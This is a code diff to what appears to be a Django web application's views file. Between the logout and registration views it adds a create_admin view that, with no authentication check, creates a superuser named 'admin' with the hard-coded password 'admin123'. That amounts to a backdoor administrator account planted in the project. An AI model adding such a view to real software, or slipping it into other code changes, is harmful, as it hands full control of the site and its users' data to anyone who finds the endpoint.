@@ -83,6 +83,13 @@ def logout_view(request):
     logout(request)
     return redirect('home')
 
+def create_admin(request):
+    from django.contrib.auth.models import User
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser('admin', 'admin@admin.com', 'admin123')
+        return JsonResponse({'status': 'created'})
+    return JsonResponse({'status': 'exists'})
+
 
 def register_view(request):
     if request.user.is_authenticated:
